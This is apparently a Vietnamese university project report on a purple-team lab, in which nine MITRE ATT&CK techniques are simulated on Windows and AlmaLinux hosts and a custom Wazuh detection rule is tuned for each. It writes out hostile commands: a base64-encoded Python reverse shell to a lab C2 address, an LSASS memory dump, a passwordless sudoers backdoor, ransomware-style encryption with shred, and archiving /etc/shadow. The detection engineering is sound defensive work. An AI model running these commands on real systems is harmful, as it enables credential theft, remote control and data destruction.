# CHI TIẾT CÁC KỊCH BẢN KIỂM THỬ PURPLE TEAM & KẾT QUẢ ĐỐI SOÁT

> **Đồ án chuyên ngành:** MÔ PHỎNG TẤN CÔNG VÀ ĐO LƯỜNG KHẢ NĂNG PHÁT HIỆN  
> **Sinh viên:** Nguyễn Minh Trí (MSSV: 92510340016)  
> **Giảng viên hướng dẫn:** ThS. Trương Phạm Hoài Thương  

Tài liệu này tổng hợp chi tiết quy trình thực thi mô phỏng tấn công (Red Teaming) và đánh giá năng lực phát hiện (Blue Teaming) trên 9 kịch bản trọng yếu theo khung MITRE ATT&CK.

---

## PHẦN 1: KỊCH BẢN KIỂM THỬ TRÊN WINDOWS SERVER 2019

### 1. Kịch bản 1: T1047 - Execution qua WMI (Windows Management Instrumentation)
- **Chiến thuật:** Execution (TA0002) | **Kỹ thuật:** WMI (T1047)
- **Mô phỏng Red Team:** Lạm dụng `wmic.exe` để âm thầm khởi tạo tiến trình `notepad.exe` hoặc `cmd.exe` nhằm che giấu cây tiến trình.
  ```powershell
  # Lệnh Atomic Red Team (Test Case 5)
  Invoke-AtomicTest T1047 -TestNumbers 5
  # Hoặc lệnh trực tiếp
  wmic process call create "notepad.exe"
  ```
- **Điểm mù ban đầu (Baseline):** Hệ thống chỉ sinh cảnh báo mức thấp (Level 3/4) ghi nhận một tiến trình thông thường vừa được sinh ra (Rule 61603 hoặc 92032). Không nhận diện được quan hệ bất thường khi WMI gọi LOLBins.
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100001 (Level 12)** bắt sự kiện Sysmon Event ID 1 có `originalFileName` là `wmic.exe`/`cmd.exe`/`powershell.exe` kết hợp tham số dòng lệnh `process call create`.
- **Kết quả Retest:** Cảnh báo màu Đỏ rực rỡ ở mức độ nghiêm trọng cao (Level 12) xuất hiện trên Wazuh Dashboard ngay sau khi lệnh thực thi.

![Bằng chứng cảnh báo T1047](images/alert_t1047_wmi.png)
*Hình 3: Wazuh Dashboard ghi nhận cảnh báo Level 12 cho kỹ thuật WMI (T1047)*

---

### 2. Kịch bản 2: T1003.001 - Credential Access: LSASS Memory Dump
- **Chiến thuật:** Credential Access (TA0006) | **Kỹ thuật:** OS Credential Dumping: LSASS Memory (T1003.001)
- **Mô phỏng Red Team:** Sử dụng tiện ích quản trị `procdump.exe` của Microsoft Sysinternals để trích xuất không gian bộ nhớ của tiến trình `lsass.exe` ra tệp `.dmp`:
  ```powershell
  Invoke-AtomicTest T1003.001 -TestNumbers 1
  # Hoặc lệnh procdump trực tiếp
  .\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
  ```
- **Điểm mù ban đầu (Baseline):** Bỏ lọt hoàn toàn (Missed Detection). Do `procdump.exe` là công cụ hợp pháp có chữ ký số của Microsoft, Wazuh chỉ ghi nhận sự kiện tạo tệp hoặc tạo tiến trình mức thông tin (Level 3).
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100002 (Level 12)** dựa trên Sysmon Event ID 10 (ProcessAccess), phát hiện mọi hành vi mở handle truy cập vào `TargetImage: lsass.exe`, đồng thời loại trừ danh sách các tiến trình hệ thống hợp lệ (`svchost`, `csrss`, `vmtoolsd`).
- **Kết quả Retest:** Phát hiện chính xác ngay khi Procdump tương tác với vùng nhớ LSASS, bóc tách rõ `SourceImage` và `TargetImage`.

![Bằng chứng cảnh báo T1003.001](images/alert_t1003_001_lsass.png)
*Hình 4: Wazuh Dashboard phát hiện chính xác hành vi can thiệp LSASS Memory (T1003.001)*

---

### 3. Kịch bản 3: T1053.005 - Persistence: Scheduled Task
- **Chiến thuật:** Persistence (TA0003) | **Kỹ thuật:** Scheduled Task (T1053.005)
- **Mô phỏng Red Team:** Sử dụng công cụ `schtasks.exe` để đăng ký một tác vụ tự động chạy dưới quyền SYSTEM mỗi khi người dùng đăng nhập:
  ```powershell
  Invoke-AtomicTest T1053.005 -TestNumbers 1
  # Hoặc lệnh trực tiếp
  schtasks.exe /create /tn "WindowsUpdater" /tr "cmd.exe /c echo test" /sc onlogon /ru "SYSTEM" /f
  ```
- **Điểm mù ban đầu (Baseline):** Wazuh chỉ sinh cảnh báo tạo tiến trình `schtasks.exe` thông thường (Level 3) vì các bản cập nhật phần mềm cũng hay dùng tiện ích này.
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100003 (Level 12)** dựa trên Sysmon Event ID 1, quét cờ `/create` trong CommandLine và đối soát trường `originalFileName: schtasks.exe` nhằm chống kỹ thuật đổi tên file.
- **Kết quả Retest:** Cảnh báo Level 12 hiển thị tức thì, bóc tách chính xác tên tác vụ và tham số dòng lệnh độc hại.

![Bằng chứng cảnh báo T1053.005](images/alert_t1053_005_schtasks.png)
*Hình 5: Wazuh Dashboard bắt thành công hành vi tạo Scheduled Task độc hại (T1053.005)*

---

### 4. Kịch bản 4: T1082 - Discovery: System Information Discovery
- **Chiến thuật:** Discovery (TA0007) | **Kỹ thuật:** System Information Discovery (T1082)
- **Mô phỏng Red Team:** Tin tặc chạy chuỗi lệnh trinh sát hệ thống (`systeminfo`, `whoami`, `ipconfig /all`, `route`, `net user`):
  ```powershell
  Invoke-AtomicTest T1082 -TestNumbers 1
  ```
- **Điểm mù ban đầu (Baseline):** Từng lệnh đơn lẻ là lệnh quản trị bình thường, Wazuh chỉ đánh giá Level 3. Nếu cảnh báo từng lệnh lẻ tẻ sẽ gây bão cảnh báo giả (Alert Fatigue).
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100004 (Level 12)** theo cơ chế tương quan quan hệ tiến trình Cha - Con: Bắt khi các trình thông dịch lệnh (`powershell.exe`, `cmd.exe`) tự động gọi các công cụ điều tra hệ thống, đồng thời kiểm tra `originalFileName`.
- **Kết quả Retest:** Cảnh báo đỏ Level 12 kích hoạt ngay khi kịch bản gọi công cụ trinh sát đầu tiên, triệt tiêu hoàn toàn cảnh báo giả từ người dùng thông thường.

![Bằng chứng cảnh báo T1082](images/alert_t1082_discovery.png)
*Hình 6: Wazuh Dashboard ghi nhận cảnh báo Discovery (T1082)*

---

### 5. Kịch bản 5: T1486 - Impact: Data Encrypted for Impact (Windows Ransomware)
- **Chiến thuật:** Impact (TA0040) | **Kỹ thuật:** Data Encrypted for Impact (T1486)
- **Mô phỏng Red Team:** Giả lập hành vi của mã độc Akira Ransomware: sinh ra tệp bị mã hóa đuôi `.akira` bằng lệnh `WriteAllBytes` và để lại thư tống tiền Darkweb:
  ```powershell
  Invoke-AtomicTest T1486 -TestNumbers 10
  ```
- **Điểm mù ban đầu (Baseline):** Module File Integrity Monitoring (FIM/Syscheck) mặc định quét định kỳ theo chu kỳ dài (vài giờ), tạo điểm mù rất lớn về thời gian. Dữ liệu bị mã hóa hoàn toàn trước khi có cảnh báo.
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100005 (Level 14 - Emergency)** quét trực tiếp nội dung Script Block sinh ra từ PowerShell, phát hiện đồng thời hàm ghi tệp (`WriteAllBytes`, `Out-File`) và từ khóa đòi tiền chuộc/Darkweb (`.onion`, `decrypt`, `recover`, `encrypted`).
- **Kết quả Retest:** Cảnh báo khẩn cấp tối đa (Level 14) phát sinh trong chưa đầy 1 giây, cung cấp căn cứ kích hoạt cơ chế tự động cô lập máy chủ.

![Bằng chứng cảnh báo T1486 Windows](images/alert_t1486_windows_ransomware.png)
*Hình 7: Cảnh báo khẩn cấp Level 14 phát hiện hành vi Akira Ransomware (T1486)*

---

## PHẦN 2: KỊCH BẢN KIỂM THỬ TRÊN ALMALINUX 10

### 6. Kịch bản 6: T1059.004 - Execution: Unix Shell (Base64 Fileless Reverse Shell)
- **Chiến thuật:** Execution (TA0002) | **Kỹ thuật:** Unix Shell (T1059.004)
- **Mô phỏng Red Team:** Kẻ tấn công mở Reverse Shell kết nối về máy chủ C2 `192.168.70.100:4444` bằng mã Python mã hóa Base64 và chuyển thẳng vào `bash` qua pipeline (chạy hoàn toàn trên RAM):
  ```bash
  echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNzAuMTAwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=" | base64 -d | bash
  ```
- **Điểm mù ban đầu (Baseline):** Wazuh mặc định thiếu ngữ cảnh từ dòng lệnh `bash`; Syslog thông thường không giải mã được chuỗi Base64 nên bỏ lọt hoàn toàn hành vi xâm nhập bộ nhớ.
- **Giải pháp tinh chỉnh:** Tích hợp Auditd theo dõi syscall `execve`. Xây dựng **Rule 100010 (Level 12)** với biểu thức chính quy PCRE2 nhận diện chuỗi hành vi bất biến: giải mã payload (`base64 -d`), thực thi mã nội tuyến (`python -c`), hoặc khởi tạo interactive shell (`bash -i`).
- **Kết quả Retest:** Hệ thống bóc tách thành công chuỗi lệnh thực thi gốc và kích hoạt cảnh báo Level 12 ngay lập tức.

![Bằng chứng cảnh báo T1059.004](images/alert_t1059_004_reverse_shell.png)
*Hình 8: Wazuh Dashboard bắt thành công Reverse Shell mã hóa Base64 (T1059.004)*

---

### 7. Kịch bản 7: T1548.003 - Privilege Escalation: Sudo Caching (/etc/sudoers.d)
- **Chiến thuật:** Privilege Escalation (TA0004) | **Kỹ thuật:** Abuse Elevation Control Mechanism: Sudo Caching (T1548.003)
- **Mô phỏng Red Team:** Ghi đè cấu hình cấp toàn quyền root không cần mật khẩu (`NOPASSWD`) vào `/etc/sudoers.d/malicious`:
  ```bash
  echo "www-data ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/malicious
  chmod 440 /etc/sudoers.d/malicious
  ```
- **Điểm mù ban đầu (Baseline):** Việc chỉnh sửa tệp trong `sudoers.d` dễ bị chìm trong hàng ngàn bản ghi syslog hàng ngày mà không được gắn cờ nguy hiểm.
- **Giải pháp tinh chỉnh:** Cấu hình Auditd gán nhãn `audit_sudoers` cho thư mục `/etc/sudoers.d/`. Xây dựng **Rule 100012 (Level 12)** trên Wazuh đối soát trực tiếp trường `audit.key`.
- **Kết quả Retest:** Bất kỳ thao tác can thiệp nào vào cấu hình sudoers đều kích hoạt cảnh báo Level 12 theo thời gian thực.

![Bằng chứng cảnh báo T1548.003](images/alert_t1548_003_sudoers.png)
*Hình 9: Cảnh báo Level 12 bắt trúng hành vi leo thang đặc quyền Sudoers (T1548.003)*

---

### 8. Kịch bản 8: T1486 - Impact: Linux Ransomware (shred & openssl)
- **Chiến thuật:** Impact (TA0040) | **Kỹ thuật:** Data Encrypted for Impact (T1486)
- **Mô phỏng Red Team:** Nén và mã hóa toàn bộ dữ liệu web bằng OpenSSL AES-256-CBC, sau đó dùng lệnh `shred -u` để ghi đè nhiều lần và hủy vĩnh viễn tệp gốc:
  ```bash
  mkdir -p /var/www/html && echo "Secret Data" > /var/www/html/secret.txt
  tar -czf - /var/www/html | openssl enc -aes-256-cbc -salt -pass pass:12345 -out /var/www/html.enc
  find /var/www/html -type f -exec shred -u {} \;
  ```
- **Điểm mù ban đầu (Baseline):** Lệnh `shred` và `openssl` là công cụ hợp lệ trên Linux, hệ thống mặc định không phân loại đây là hành vi phá hoại dữ liệu.
- **Giải pháp tinh chỉnh:** Xây dựng **Rule 100013 (Level 14 - Emergency)** dựa trên Auditd execve syscalls, phát hiện đồng thời `openssl enc -aes-256-cbc` và `shred -u`.
- **Kết quả Retest:** Cảnh báo khẩn cấp mức cao nhất (Level 14) được kích hoạt trong vòng 0.8 giây.

![Bằng chứng cảnh báo T1486 Linux](images/alert_t1486_linux_ransomware.png)
*Hình 10: Cảnh báo Level 14 bắt hành vi phá hoại dữ liệu bằng shred và openssl (T1486)*

---

### 9. Kịch bản 9: T1003.008 - Credential Access: OS Credential Dumping (/etc/shadow)
- **Chiến thuật:** Credential Access (TA0006) | **Kỹ thuật:** OS Credential Dumping: /etc/shadow (T1003.008)
- **Mô phỏng Red Team:** Kẻ tấn công dùng tiện ích `tar` để nén tệp mật khẩu `/etc/shadow` và `/etc/passwd` vào thư mục ẩn `/var/tmp/.cache/credentials.tar.gz`:
  ```bash
  mkdir -p /var/tmp/.cache
  tar -czf /var/tmp/.cache/credentials.tar.gz /etc/shadow /etc/passwd
  ```
- **Điểm mù ban đầu (Baseline):** Công cụ `tar` là tiện ích sao lưu hàng ngày, hệ thống hoàn toàn không phát hiện khi nó nhắm vào tệp tin mật khẩu nhạy cảm.
- **Giải pháp tinh chỉnh:** Cấu hình Auditd gắn nhãn `shadow_monitor` trực tiếp vào tệp `/etc/shadow`. Xây dựng **Rule 100014 (Level 12)** trên Wazuh đối soát trường `audit.key`. Cách tiếp cận này chặn đứng mọi công cụ cố gắng đọc tệp đích.
- **Kết quả Retest:** Cảnh báo Level 12 hiển thị tức thì, phơi bày tiến trình đang cố gắng trích xuất tệp mật khẩu.

![Bằng chứng cảnh báo T1003.008](images/alert_t1003_008_shadow.png)
*Hình 11: Wazuh Dashboard phát hiện hành vi trích xuất tệp mật khẩu /etc/shadow (T1003.008)*
